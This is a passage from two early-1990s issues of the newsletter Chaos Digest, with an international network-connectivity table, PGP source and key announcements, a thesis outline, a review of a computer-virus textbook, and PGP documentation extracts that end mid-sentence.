Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Wed Dec  9 07:01:15 -0600 1992
From: lhl@cs.wisc.edu (L.H. Landweber )
Subject: File 1--109 Entites reseaux de connectivite internationale
Copyright: Lawrence H. Landweber & the Internet Society, 1992


                       INTERNATIONAL CONNECTIVITY
                      Version 6 - August  31, 1992

Please send corrections, information and/or comments to:

Larry Landweber
Computer Sciences Dept.
University of Wisconsin - Madison
1210 W. Dayton St.
Madison, WI 53706
lhl@cs.wisc.edu
FAX 1-608-265-2635

Include details, e.g., on connections, sites, contacts, protocols, etc.

Thanks to the many people from around the world who have provided information.

In the following, "BITNET" is used generically to refer to BITNET plus
similar networks around the world (e.g., EARN, NETNORTH, GULFNET, etc.).

Copies of various International Connectivity tables are available by
anonymous ftp from ftp.cs.wisc.edu in the connectivity_table directory.
Contacts for various countries and postscript versions of world/regional
maps showing network connections will also be available in this directory
in the near future.

SUMMARY

NUMBER OF ENTITIES WITH INTERNATIONAL NETWORK CONNECTIVITY = 109

INTERNET
   Col. 3 (Entities with international IP links.)
   I: = operational, 46 entities
BITNET
   Col. 2 (Entities with international BITNET links.)
   b: minimal, < 5 domestic sites, 20 entities
   B: widespread, >= 5 domestic sites, 29 entities
UUCP
   Col. 4 (Entities with domestic UUCP sites which are connected to the
     Global Multiprotocol Open Internet.)
   u: minimal, < 5 domestic sites, 40 entities
   U: widespread, >= 5 domestic sites, 49 entities
FIDONET
Col. 5 (Entities with international FIDONET links.)
   f: minimal, < 5 domestic sites, 15 entities
   F: widespread, >= 5 domestic sites, 52 entities
OSI
   Col. 6 (Entities with networks offering X.400 services and which are
     connected to the Global Multiprotocol Open Internet).
   o: minimal, < 5 domestic sites, 9 entities
   O: widespread, >= 5 domestic sites, 17 entities

Possible email connections to Angola, Gambia, Ghana, Malawi, Mongolia
Reunion, Tanzania have not been verified and hence are not included in the
table or in the above totals.

The Antartica Internet connection appears to be intermittently online.
There are Internet hosts in Guam but they do not respond to "ping" and
hence are not included.

----- AF  Afghanistan (Democratic Republic of)
----- AL  Albania (Republic of)
----- DZ  Algeria (People's Democratic Republic of)
----- AS  American Samoa
----- AD  Andorra (Principality of)
----- AO  Angola (People's Republic of)
----- AI  Anguilla
-I--- AQ  Antarctica
----- AG  Antigua and Barbuda
BIUF- AR  Argentina (Argentine Republic)
--u-- AM  Armenia
----- AW  Aruba
-IUF- AU  Australia
BIUFO AT  Austria (Republic of)
----- AZ  Azerbaijan
----- BS  Bahamas (Commonwealth of the)
b---- BH  Bahrain (State of)
----- BD  Bangladesh (People's Republic of)
----- BB  Barbados
--UF- BY  Belarus
BIUFO BE  Belgium (Kingdom of)
----- BZ  Belize
----- BJ  Benin (People's Republic of)
----- BM  Bermuda
----- BT  Bhutan (Kingdom of)
--u-- BO  Bolivia (Republic of)
----- BA  Bosnia-Hercegovina
---f- BW  Botswana (Republic of)
----- BV  Bouvet Island
BIUFO BR  Brazil (Federative Republic of)
----- IO  British Indian Ocean Territory
----- BN  Brunei Darussalam
b-UF- BG  Bulgaria (Republic of)
--u-- BF  Burkina Faso (formerly Upper Volta)
----- BI  Burundi (Republic of)
----- KH  Cambodia
----- CM  Cameroon (Republic of)
BIUFO CA  Canada
----- CV  Cape Verde (Republic of)
----- KY  Cayman Islands
----- CF  Central African Republic
----- TD  Chad (Republic of)
----- IO  British Indian Ocean Territory
BIUF- CL  Chile (Republic of)
--ufO CN  China (People's Republic of)
----- CX  Christmas Island (Indian Ocean)
----- CC  Cocos (Keeling) Islands
b-u-- CO  Colombia (Republic of)
----- KM  Comoros (Islamic Federal Republic of the)
----- CG  Congo (Republic of the)
----- CK  Cook Islands
b-u-- CR  Costa Rica (Republic of)
--u-- CI  Cote d'Ivoire (Republic of)
bI-f- HR  Croatia
--U-- CU  Cuba (Republic of)
b---- CY  Cyprus (Republic of)
BIUF- CS  Czechoslovakia (Czech and Slovak Federal Republic)
bIUFo DK  Denmark (Kingdom of)
----- DJ  Djibouti (Republic of)
----- DM  Dominica (Commonwealth of)
--u-- DO  Dominican Republic
----- TP  East Timor
bIu-- EC  Ecuador (Republic of)
b-u-- EG  Egypt (Arab Republic of)
----- SV  El Salvador (Republic of)
----- GQ  Equatorial Guinea (Republic of)
-IUF- EE  Estonia (Republic of)
---f- ET  Ethiopia (People's Democratic Republic of)
----- FK  Falkland Islands (Malvinas)
----- FO  Faroe Islands
--u-- FJ  Fiji (Republic of)
BIUFO FI  Finland (Republic of)
BIUFO FR  France (French Republic)
--u-- GF  French Guiana
--u-- PF  French Polynesia
----- TF  French Southern Territories
----- GA  Gabon (Gabonese Republic)
----- GM  Gambia (Republic of the)
---f- GE  Georgia (Republic of)
BIUFO DE  Germany (Federal Republic of)
----- GH  Ghana (Republic of )
----- GI  Gibraltar
BIUFo GR  Greece (Hellenic Republic)
---f- GL  Greenland
----- GD  Grenada
--u-- GP  Guadeloupe (French Department of)
----- GU  Guam
----- GT  Guatemala (Republic of)
----- GN  Guinea (Republic of)
----- GW  Guinea-Bissau (Republic of)
----- GY  Guyana (Republic of)
----- HT  Haiti (Republic of)
----- HM  Heard and McDonald Islands
----- HN  Honduras (Republic of)
BI-F- HK  Hong Kong (Hisiangkang, Xianggang)
bIUF- HU  Hungary (Republic of)
-IUF- IS  Iceland (Republic of)
bIUfo IN  India (Republic of)
--uF- ID  Indonesia (Republic of)
----- IR  Iran (Islamic Republic of)
----- IQ  Iraq (Republic of)
BIUFo IE  Ireland
BIUF- IL  Israel (State of)
BIUFO IT  Italy (Italian Republic)
--u-- JM  Jamaica
BIUF- JP  Japan
----- JO  Jordan (Hashemite Kingdom of)
--U-- KZ  Kazakhstan
---f- KE  Kenya (Republic of)
----- KI  Kiribati (Republic of)
----- KP  Korea (Democratic People's Republic of)
BIUF- KR  Korea (Republic of )
----- KW  Kuwait (State of)
--U-- KG  Kyrgyzstan
----- LA  Lao People's Democratic Republic
--UF- LV  Latvia (Republic of)
----- LB  Lebanon (Lebanese Republic)
----- LS  Lesotho (Kingdom of)
----- LR  Liberia (Republic of)
----- LY  Libyan Arab Jamahiriya
----- LI  Liechtenstein (Principality of)
--UFo LT  Lithuania
bIuFo LU  Luxembourg (Grand Duchy of)
---F- MO  Macau (Ao-me'n)
----- MG  Madagascar (Democratic Republic of)
----- MW  Malawi (Republic of)
b-UF- MY  Malaysia
----- MV  Maldives (Republic of)
--u-- ML  Mali (Republic of)
----- MT  Malta (Republic of)
----- MH  Marshall Islands (Republic of the)
----- MQ  Martinique (French Department of)
----- MR  Mauritania (Islamic Republic of)
---f- MU  Mauritius
BIuF- MX  Mexico (United Mexican States)
----- FM  Micronesia (Federated States of)
---F- MD  Moldova (Republic of)
----- MC  Monaco (Principality of)
----- MN  Mongolia (Mongolian People's Republic)
----- MS  Montserrat
----- MA  Morocco (Kingdom of)
--u-- MZ  Mozambique (People's Republic of)
----- MM  Myanmar (Union of)
--u-- NA  Namibia (Republic of)
----- NR  Nauru (Republic of)
----- NP  Nepal (Kingdom of)
BIUFO NL  Netherlands (Kingdom of the)
----- AN  Netherlands Antilles
----- NT  Neutral Zone (between Saudi Arabia and Iraq)
--u-- NC  New Caledonia
-IuF- NZ  New Zealand
--u-- NI  Nicaragua (Republic of)
--u-- NE  Niger (Republic of the)
----- NG  Nigeria (Federal Republic of)
----- NU  Niue
----- NF  Norfolk Island
----- MP  Northern Mariana Islands (Commonwealth of the)
BIUFO NO  Norway (Kingdom of)
----- OM  Oman (Sultanate of)
--U-- PK  Pakistan (Islamic Republic of)
----- PW  Palau (Republic of)
---F- PA  Panama (Republic of)
--u-- PG  Papua New Guinea
--u-- PY  Paraguay (Republic of)
--U-- PE  Peru (Republic of)
--uF- PH  Philippines (Republic of the)
----- PN  Pitcairn
BIUF- PL  Poland (Republic of)
bIUFO PT  Portugal (Portuguese Republic)
BIUF- PR  Puerto Rico
----- QA  Qatar (State of)
----- RE  Re'union (French Department of)
----- RO  Romania
b-UF- RU  Russian Federation
----- RW  Rwanda (Rwandese Republic)
----- SH  Saint Helena
----- KN  Saint Kitts and Nevis
----- LC  Saint Lucia
----- PM  Saint Pierre and Miquelon (French Department of)
----- VC  Saint Vincent and the Grenadines
----- WS  Samoa (Independent State of)
----- SM  San Marino (Republic of)
----- ST  Sao Tome and Principe (Democratic Republic of)
B---- SA  Saudi Arabia (Kingdom of)
--uf- SN  Senegal (Republic of)
--u-- SC  Seychelles (Republic of)
----- SL  Sierra Leone (Republic of)
bIuF- SG  Singapore (Republic of)
bI-FO SI  Slovenia
----- SB  Solomon Islands
----- SO  Somalia (Somali Democratic Republic)
-IUFo ZA  South Africa (Republic of)
BIUFO ES  Spain (Kingdom of)
--U-- LK  Sri Lanka (Democratic Socialist Republic of)
----- SD  Sudan (Democratic Republic of the)
--u-- SR  Suriname (Republic of)
----- SJ  Svalbard and Jan Mayen Islands
----- SZ  Swaziland (Kingdom of)
BIUFo SE  Sweden (Kingdom of)
BIUFO CH  Switzerland (Swiss Confederation)
----- SY  Syria (Syrian Arab Republic)
BIuF- TW  Taiwan, Province of China
--u-- TJ  Tajikistan
----- TZ  Tanzania (United Republic of)
-IuF- TH  Thailand (Kingdom of)
--u-- TG  Togo (Togolese Republic)
----- TK  Tokelau
----- TO  Tonga (Kingdom of)
--u-- TT  Trinidad and Tobago (Republic of)
bIu-o TN  Tunisia
B--f- TR  Turkey (Republic of)
----- TM  Turkmenistan
----- TC  Turks and Caicos Islands
----- TV  Tuvalu
---f- UG  Uganda (Republic of)
--UF- UA  Ukraine
----- AE  United Arab Emirates
bIUFO GB  United Kingdom (United Kingdom of GB and Northern Ireland)
BIUFO US  United States (United States of America)
----- UM  United States Minor Outlying Islands
b-U-- UY  Uruguay (Eastern Republic of)
--U-- UZ  Uzbekistan
--u-- VU  Vanuatu (Republic of, formerly New Hebrides)
----- VA  Vatican City State (Holy See)
-IU-- VE  Venezuela (Republic of)
----- VN  Vietnam (Socialist Republic of)
----- VG  Virgin Islands (British)
---f- VI  Virgin Islands (U.S.)
----- WF  Wallis and Futuna Islands
----- EH  Western Sahara
----- YE  Yemen (Republic of)
----- YU  Yugoslavia (Socialist Federal Republic of)
----- ZR  Zaire (Republic of)
---f- ZM  Zambia (Republic of)
--uf- ZW  Zimbabwe (Republic of)

------------------------------

Date: Thu Apr 15 16:39:04 -0500 1993
From: Online93@chaz.demon.co.uk ("Learned Information Ltd." )
Subject: File 2--17th Intl. Online Information Meeting (collaboration)


                **   ONLINE INFORMATION 93   **
                -------------------------------

                      7 - 9 December 1993
                     Olympia 2, London, UK


                        CALL FOR PAPERS


Suggested themes for the 17th International Online Information Meeting
are set out below - a mixture of exciting up-and-coming developments,
techniques and technologies in both established areas as well as newer ones.
Of course, it goes without saying that papers on other topics related to
the overall Online and CD-ROM conference and exhibition (eg database design
and evaluation, search strategies, marketing of information products, CD-ROM
utilization etc) will be equally acceptable.

We are also seeking suitable demonstrative technologies e.g. - the Internet,
creating your own CD-ROMs, et.all.

Suggested Themes:

- Online and Internet;
- Multimedia solutions;
- Image handling;
- Virtual reality;
- New methods of information delivery;
- Full full-text (ie the inclusion of graphs, chemical structures, tables,
  diagrams and pictures as well as text);
- Metadatabases (ie information systems which describe other information
  systems and resources);
- Managing online and CD-ROM.

This year we also anticipate having panels which will include a mix of
users, suppliers and vendors discussing such current topics as: CD-ROM
networking experience; Can we use all the databases and CD-ROMs we have
already or do we need still more? Where do we go from here with online?

Submit an abstract of 300 words to the address below for consideration.
You will then be contacted about writing a full paper.  All full papers have
a deadline of 9 July 1993.

For further information contact:

The Conference Department
Learned Information
Woodside
Hinksey Hill
Oxford, OX1 5AU, UK.
Tel: +44 (0)865 730275
Fax: +44 (0)865 736354
Internet: online93@chaz.demon.co.uk

------------------------------

Date: Thu, 15 Apr 1993 22:38:53 GMT
From: grady@netcom.com (1016/2EF221 )
Subject: File 3--Disponibilites des sources en C pour Macintosh de PGP v2.2
Repost from: comp-society-privacy@uunet.uu.net

*** SOURCE code to Macintosh PGP 2.2 now available via anonymous FTP ***

FTP netcom.com
CD pub/grady
MGET MacPGP2.2src.sea.hqx
MGET MacPGP2.2srcSIGNATURE

Convert to a Compact Pro self-extracting archive with BinHex 4.0.

If appropriate, check the digital signature of the .hqx file with your copy
of PGP.  (Non-Macintosh users wishing to check the digital signature please
note that 'CR' denotes the end-of-line on a Macintosh, not 'LF' or 'CRLF'.)

For the purposes of the ITAR act, this 'unclassified technical documenta-
tion' is hereby released into the public domain.  (However no representation
is made as to copyright or other commercial rights that may exist in this
package.)

Full source code, Symantec THINK C 5.0.4 projects and full user documenta-
tion is included for both 68020 and 68000 versions of Pretty Good Privacy, a
strong public key encryption and digital signature application using the RSA
algorithm patented in the United States and the IDEA cipher patented in
Switzerland.

No executables are included.

Executables are available via anonymous FTP from:

     * leif.thep.lu.se (Sweden)
     * night.nig.ac.jp (Japan)
     * van-bc.wimsey.bc.ca (Canada)
     * soda.berkeley.edu (P.R. of Berkeley)
     * src.doc.ic.ac.uk (United Kingdom)
     * ghost.dsi.unimi.it (Italy)
     * plaza.aarnet.edu.au (Australia)
     * nic.funet.fi (Finland)

Other's public keys are available from anonymous server sites:
(Send message subject "help" for more information.)

Internet sites:
     * pgp-public-keys@junkbox.cc.iastate.edu
                Michael Graff
                explorer@iastate.edu
                FTP: tbird.cc.iastate.edu:/usr/explorer/public-keys.pgp
     * pgp-public-keys@toxicwaste.mit.edu
                Derek Atkins
                warlord@MIT.EDU
                FTP: toxicwaste.mit.edu:/pub/keys/public-keys.pgp
     * pgp-public-keys@phil.utmb.edu
                John Perry
                perry@phil.utmb.edu
                FTP: phil.utmb.edu:/pub/pgp/public-keys.pgp
     * pgp-public-keys@demon.co.uk
                Mark Turner
                mark@demon.co.uk
                FTP: ftp.demon.co.uk:/pub/pgp/pubring.pgp

UUCP site:
     * pgp-public-keys@jpunix.com
                John Perry
                perry@jpunix.com

The executable application built from these sources has NOT been licensed by
RSA Data Security, Inc. nor has the RSA public key algorithm or the IDEA
block cipher algorithm been approved by the National Security Agency.

This unclassified technical documentation is made available for EDUCATIONAL
USE ONLY; possession, distribution, or use of an executable binary built
from this source may be a civil or criminal offense.

Suggested improvements, bugs, or comments should be directly posted to
alt.security.pgp or to the principal developers listed among the source
documents.  General questions and comments about public key cryptography or
the IDEA cipher may be posted to alt.security.pgp or to the sci.crypt Usenet
groups.
--
grady@netcom.com  2EF221 / 15 E2 AD D3 D1 C6 F3 FC  58 AC F7 3D 4F 01 1E 2F

------------------------------

Date: Wed Jan 20 15:49:42 EST 1993
From: mlf3@Lehigh.EDU (Matt Fante )
Subject: File 4--Clef publique PGP v2.1

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.1

mQCNAirF5XUAAAEEANL9QBvVl05oXxd3HkWstTNKbuXYuXs3OcrkQ/a2Op3qpqaq
m6XgZ7NQFsL4Ueulkuz8ftyvTbAcVKi6YYopt5b4eMDOx0L50jaiGX+YfMBZySCw
N7JvYapcDGKU26AKnl+HUo1mF7g9k4qa842qD5TiHSk4/5qrtjUnTidWqgrVAAUR
tBxNYXR0IEZhbnRlIDxtbGYzQExlaGlnaC5FRFU+iQBVAgUQKw1Febc87GxCPv3v
AQHDwQH9HGxf60wrW/dhzDJQP0A+lgB5ScYW4uklBJ2Jw/RM1tr8QElDfI9NnUyI
3tmmQ9+5Dj2tVedN+ZE9gBxrxdMDgYkAlQIFECsNQILtNQfTXtAG0QEB70wD/jIc
znbuzQKlkz5dqmWBKSUn5MxP1kk5Wqcy31YknmmGcvgM7RJpXn0SP97vI+NhpTwA
DrYuVtxAWAPRaz6bWeA83DQQ4ZYbV3MacgI+peU6zilE1BDJZbhHKmgHIDf5vBYa
1C1bt3zMu4cQo1TKgGy7XVaOB0h8iWava5MqwHxDiQCVAgUQKwvaoFERd/IOpm4d
AQHvhwP8CVc4desQrMN0uud1DyeXl/RgJKOobfo1tQrr2GpeYHakKWrkaDrFhcxK
Gbkm2NDSUJZ66AREwHIVY1ob38gb2bGqPvboX//QbZiDFI7lRQQ7gclv0amaNtsJ
Zq29uDnDS+9S8HCCBxIjlSWii4cA0545MUhOj64vCLJ5bSzXKB20KE1hdHQgRmFu
dGUgPGdsb2NrbWFuQGJpZmYuY2MubGVoaWdoLmVkdT60HE1hdHQgRmFudGUgPG1s
ZjNAbGVoaWdoLmVkdT6JAJUCBRArC/nnCaEfMUti9+0BAaeLA/0SFKRJmQZAg1Ub
2DWw6o+ECaKjNKaQUJ50PKOWMGeXcXsZSWbZPWSsE30rAcmsFWNswNbfFBDRNvJg
bF5YiLlekOt1h08iM1OkQ5uPlZ+0swufO1Kdx8Z94wnoYjRj/RXaX4crl6LAJTBK
0qditCmP5+vFXrthOQk2E8IVAm+t7okAlQIFECsLzFsUosQWfdSqbwEBCzQD/RSl
gaI6i23T4O9OEzowL0vhlRieAIGF/GURf9aL00r8mzlTnj+gcPF/dx42aDbRcr6y
g+VynDRsmWUihIf0Um4NqmNpTQUquTUCZgKUa6qK8ZjP/25jTkqwv9zPvv77eDia
0r2tdHj4DrDRE6gQLHiLiVWp78Oj6izzuVTdU74piQCVAgUQKwEbiTUnTidWqgrV
AQE/JAP/UMgXYJ2PHRctwW5s+/3qRvFJ+V8KNNAyMIekxzGEUAYTFjkkDhqoUMak
/+JZwSJNGutGSM8VWw6yyr4TuuMt5f8VvdQ0pf2SBsFRfxzmBd+Oo0O+5SKjGohu
4hvcyjdynyYWEYuSRtSRbCS8sAk6P1wWuSXnokyBD2HGoIM/C2mJAJUCBRArAeqb
19O/P+E2aCkBAWA+A/4l9tHgYzvgngwJUxq5bFZoPGhMdzFDgzeVPHQEnuz0nJYt
HLKWA+2KXae6u67fJK+oL7KLg30Q9ZwRZY6O5xImUZDMWq4Lccr3sUJMiV/Bedn9
8sn2ucmSvzOY4zl5wfLJQOfZfl/CDaFr30BwkXqlQ85rtWY1gynw64PrhWgnig==
=C9EE
-----END PGP PUBLIC KEY BLOCK-----

       PGP 2.1 and RIPEM Public Keys Available Upon Request

------------------------------

Date: Mon Apr  5 23:41:04 -0500 1993
From: LUX%DMRHRZ11.BITNET@VTVM1.CC.VT.EDU (Harald Lux )
Subject: File 6--Publication scolaire de e-journaux (these)

    The Role of Publishers in the Age of Electronically
               Published Scholarly Journals

         - Current Situation and Recommendation -

Objective:
==========

Analysing  the publication process of electronic  journals
shows  that the functions of the publisher are often taken
over  by other participants of the publication chain.  Aim
of  this  diploma thesis is to investigate which functions
publishers   can   hold  in  the  age  of   electronically
published  scholarly journals under economic aspects.  The
main  focus  lies on the distribution via networks.  Other
electronic forms are seen only as complementary.

The  general  functions of publishers,  as  found  in  the
literature,  are the basis for the representation  of  the
current  situation of publishing scholarly journals.  This
is  followed  by  a separate analysis of  the  publisher's
functions  which can be found by electronically  published
scholarly  journals.  Each function will  be  investigated
with  regard to its economic relevance. Results should  be
rated   recommendations  with  consideration  of  possible
problems.   The  thesis  concludes  with  a   consolidated
analysis of the isolated recommendations.


Structure:
==========

1 Foundation

  1.1  Electronic Publishing

  1.2  Publishers and their Functions
       1.2.1  Primary Functions
              1.2.1.1  Selection
              1.2.1.2  Financing
              1.2.1.3  Production
              1.2.1.4  Distribution
       1.2.2  Complementary Functions

2 Scholarly Journals Today

  2.1  Traditional Publication
       2.1.1  (Examples)
       2.1.2  Functions of the Publisher

  2.2  Electronic Publication
       2.2.1  Reasons
       2.2.2  (Examples)
       2.2.3  Functions of the Publisher

3 Possibilities for Publishers in the Age of Electronically
  Published Scholarly Journals

  3.1  Separated Analysis
       3.1.1  Primary Functions
              3.1.1.1  Selection
              3.1.1.2  Financing
              3.1.1.3  Production
              3.1.1.4  Distribution
       3.1.2  Complementary Functions

  3.2  Consolidated Analysis
--
Harald Lux            lux@dmrhrz11.hrz.uni-marburg.de
Moischter Str. 45     lux@dmrhrz11.bitnet
W-3550 Marburg 7      CIS: 100024,3231
Germany               Tel.: +49 228 461853

------------------------------

Date: Sun Apr 11 14:08:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG )
Subject: File 6--Critique de "Rogue Programs", L. Hoffman, ed.
Copyright: Robert M. Slade, 1993

            _Rogue Programs: Viruses, Worms and Trojan Horses_
                        Ed. Lance J. Hoffman

1990, 0-442-00454-0
Van Nostrand Reinhold
c/o Nelson Canada
1120 Birchmont Road
Scarborough, Ontario M1K 5G4
Phone: 416-752-9100
Fax:   416-752-9646

Reading the list of contributors to this work was rather like "old home
week" at VIRUS-L.  The introduction states that the book arose from
Hoffman's frustration over the lack of a suitable text for a virus seminar
and that the seminar participants compiled the material from available
sources.  Even one of the seminar participants, Chris Feudo, has recently
released a computer virus handbook.

Hoffman's "big iron" bias shows through occasionally in his lack of
distinction between "network" and "micro" viral programs (someone with a
$1000 computer "within days can be writing viruses that attempt to break
into world-wide networks") and insists upon destructive and "service denial"
capabilities when defining a virus.  Overall, however, he tries to present a
balanced and realistic view of the virus situation.

The essays contained in the book are grouped into five sections.  The
distinctives between the sections are somewhat clearer than with Denning's
"Computers Under Attack".  The overall design of the book makes a lot of
sense as a textbook (its primary purpose, after all), but may be less lucid
to the home or business user looking for specific direction on protection of
their system.

The first section contains papers that attempt to look at the broad overview
of viral type programs.  Although this book is primarily intended as a text
in computer security courses (presumably at the university level), one still
feels the lack of an initial concise and clear statement of what viral
programs are today.  This desire may be unrealistic: the majority of the
works contained in the book were prepared, at least in initial form, prior
to 1990.  By the time the book was published, however, a larger view of the
virus situation should have been possible.  Still, as introduction and
background material within the context of a virus related course, these
papers are all of significant value.

The second part relates to social and legal topics.  The current state of
(American) law figures heavily in this section.  The discussion of ethics
is quite limited.  Karen Forcht's article on the subject is very terse,
seemingly being only a report of various surveys.  (The most interestingly
point I found in it was the contention, by CEOs, that ethics should be
taught in the classroom, rather than on the job, which displays either a
surprising confidence in the school system, or a definite unwillingness to
face the issue themselves.)

Parts three and four separate the study of viral programs into the realms of
personal (micro) computers and "network" situations.  This distinction is
important, and it is heartening to see it made here.  The opening essay in
the micro section, by Hoffman and Brad Stubbs, attempts to walk the line
between giving information to the user who needs it without giving too much
assistance to virus-writer-wannabes.  In my own view it falls somewhat short
in this, being perhaps more technical than an introductory article warrants.
However, it is a good compilation of the technical background to viral
programs in the MS-DOS environment.  (The micro section closes on a slightly
worse note, with the PC Magazine reviews that are starting to become
somewhat infamous in the virus research community.)

The network virus section contains the two major "dissections" of the
Internet Worm.  Surprisingly, however, none of the other major network
incidents, such as the CHRISTMA EXEC and the "WANK" worm, are mentioned.
Some of the other papers in this section might have more general application
to the virus problem overall, such as studies into cryptographic
authentication.  Others, such as an exploration of viral programs in
"electronic warfare" seem to be "blue sky" exscursions with very little
relation to reality.

The final section is entitled "Emerging Theory of Computer Viruses".  It
contains two articles by Fred Cohen, and one by Leonard Ableman reporting
Fred's findings.  With all due respect to Dr. Cohen, there might be room for
works by other theoreticians here.

As a textbook, this tome contains a diverse range of material well suited to
a seminar on viral programs.  While some of the material is becoming dated,
and some of the points of view are oversimplified, I have not yet found
another book as well surited for raising topics for discussion.  The one
major flaw is the lack of balance and opposition to some of the wilder
flights of fancy.  It would be well to have someone point out that the human
immune system cannot fully be used as an analogy of computer virus defence,
or to point out the difficulties involved in transmitting a virus from a
radio to a fighter aircraft to a military command centre.  In the classroom,
of course, this job belongs to the instructor.

Those looking for a reference for protection against viral programs may find
this book to be unsuitable.  It does, however, have a place as background
material for those large firms in the process of planning overall corporate
data security strategy.  Again, it should be used to generate discussion on
some issues which other "how to" books do not yet address.

(Post scriptum: Lance Hoffman, in responding to the initial draft of this
review, has been most gracious.  He has also acknowledged the shortcomings
of the current version of the book.  There are plans for a new version,
which may be released some time in 1994.  Hopefully the few gaps in the
current work will be covered in that.)

------------------------------

End of Chaos Digest #1.17
************************************

Chaos Digest               Lundi 12 Avril 1993          Volume 1 : Numero 18

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.18 (12 Avril 1993)
File 1--Cryptographie a clef publique: PGP

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Wed Mar 24 15:03:59 CDT 1993
From: celma_s@epita.fr (Samuel Celma )
Subject: File 1--Cryptographie a clef publique: PGP


                 Phil Zimmerman's PGP (Pretty Good Privacy)
                    Public Key Encryption for the Masses


[ PGP Documentation extracts ]

What is PGP?

Pretty Good(tm) Privacy (PGP), from Phil's Pretty Good Software, is a
high security cryptographic software application for MSDOS, Unix,
VAX/VMS, and other computers.  PGP allows people to exchange files or
messages with privacy, authentication, and convenience.  Privacy
means that only those intended to receive a message can read it.
Authentication means that messages that appear to be from a
particular person can only have originated from that person.
Convenience means that privacy and authentication are provided
without the hassles of managing keys associated with conventional
cryptographic software.  No secure channels are needed to exchange
keys between users, which makes PGP much easier to use.  This is
because PGP is based on a powerful new technology called "public key"
cryptography.

PGP combines the convenience of the Rivest-Shamir-Adleman (RSA)
public key cryptosystem with the speed of conventional cryptography,
message digests for digital signatures, data compression before
encryption, good ergonomic design, and sophisticated key management.
And PGP performs the public-key functions faster than most other
software implementations.  PGP is public key cryptography for the
masses.

PGP does not provide any built-in modem communications capability.
You must use a separate software product for that.

Why Do You Need PGP?

It's personal.  It's private.  And it's no one's business but yours.
You may be planning a political campaign, discussing your taxes, or
having an illicit affair.  Or you may be doing something that you
feel shouldn't be illegal, but is.  Whatever it is, you don't want
your private electronic mail (E-mail) or confidential documents read
by anyone else.  There's nothing wrong with asserting your privacy.
Privacy is as apple-pie as the Constitution.

Perhaps you think your E-mail is legitimate enough that encryption is
unwarranted.  If you really are a law-abiding citizen with nothing to
hide, then why don't you always send your paper mail on postcards?
Why not submit to drug testing on demand?  Why require a warrant for
police searches of your house?  Are you trying to hide something?
You must be a subversive or a drug dealer if you hide your mail
inside envelopes.  Or maybe a paranoid nut.  Do law-abiding citizens
have any need to encrypt their E-mail?

What if everyone believed that law-abiding citizens should use
postcards for their mail?  If some brave soul tried to assert his
privacy by using an envelope for his mail, it would draw suspicion.
Perhaps the authorities would open his mail to see what he's hiding.
Fortunately, we don't live in that kind of world, because everyone
protects most of their mail with envelopes.  So no one draws suspicion
by asserting their privacy with an envelope.  There's safety in
numbers.  Analogously, it would be nice if everyone routinely used
encryption for all their E-mail, innocent or not, so that no one drew
suspicion by asserting their E-mail privacy with encryption.  Think
of it as a form of solidarity.

Today, if the Government wants to violate the privacy of ordinary
citizens, it has to expend a certain amount of expense and labor to
intercept and steam open and read paper mail, and listen to and
possibly transcribe spoken telephone conversation.  This kind of
labor-intensive monitoring is not practical on a large scale.  This
